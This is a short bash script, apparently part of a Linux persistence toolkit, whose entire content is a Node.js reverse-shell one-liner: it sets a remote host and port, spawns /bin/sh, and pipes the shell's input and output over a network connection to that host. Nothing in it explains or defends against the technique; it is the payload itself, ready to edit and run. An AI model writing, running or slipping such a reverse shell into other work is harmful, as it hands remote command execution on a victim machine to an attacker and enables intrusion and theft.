linper=yes

#!/bin/bash

export RHOST=0.0.0.0
export RPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
net.connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
});'
